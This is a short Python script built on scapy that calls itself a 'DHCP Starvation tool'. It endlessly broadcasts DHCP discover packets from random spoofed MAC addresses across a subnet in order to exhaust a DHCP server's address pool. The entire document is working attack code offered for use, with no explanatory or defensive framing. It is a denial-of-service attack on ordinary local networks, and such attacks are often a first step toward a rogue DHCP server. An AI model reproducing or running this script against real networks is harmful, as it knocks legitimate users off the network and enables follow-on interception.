#!/bin/python3
from scapy.all import *
from time import sleep
import argparse

parse = argparse.ArgumentParser( description = ' DHCP Starvation tool ' )
parse.add_argument( '-t', required = True, help = ' target dhcp server ' )
parse.add_argument( '-n', required = True, help = ' network subnet ex)192.168.0. ' )
args = parse.parse_args()
dhcpServer = args.t

def dhcpSta():
    for i in range( 2, 254 ):
        randMac = RandMAC()
        reqip = args.n + str(i)
        print('Trying ' + reqip + '...')
        Etpkt = Ether( src = randMac, dst = 'ff:ff:ff:ff:ff:ff' )
        IPpkt = IP( src = '0.0.0.0', dst = '255.255.255.255' )
        UDpkt = UDP( sport = 68, dport = 67 )
        BOpkt = BOOTP( chaddr = randMac )
        OFpkt = DHCP( options = [( 'message-type','discover' ),'end'] )

        payload = Etpkt/IPpkt/UDpkt/BOpkt/OFpkt
        sendp(payload)

while True:
    dhcpSta()
